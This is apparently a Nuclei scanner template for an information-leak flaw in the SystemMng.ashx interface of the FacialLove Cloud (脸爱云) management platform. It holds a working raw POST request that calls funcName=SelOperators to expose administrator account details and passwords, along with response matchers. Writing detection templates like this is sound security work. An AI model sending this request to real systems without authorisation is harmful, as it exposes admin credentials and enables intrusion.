id: faciallovecloudplatform-systemmng-infoleak

info:
  name: FacialLove Cloud Platform SystemMng.ashx - Information Leak
  author: qwtd
  severity: medium
  description: |
    脸爱云一脸通智慧管理平台存在信息泄露漏洞，该漏洞源于SystemMng.ashx接口处存在信息泄露漏洞，攻击者能够利用该漏洞通过SelOperators参数泄露的当前管理员的敏感信息，包括账号密码登录系统后台。
  reference:
    - https://mp.weixin.qq.com/s/HzLES0CZ-uOsKcOyjqcXUA
  tags: 脸爱云一脸通智慧平台

http:
  - raw:
      - |
        POST /SystemMng.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
        Accept: application/json, text/javascript, */*; q=0.01
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        
        username=admin&funcName=SelOperators

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "userno"
          - "people_node"
        condition: and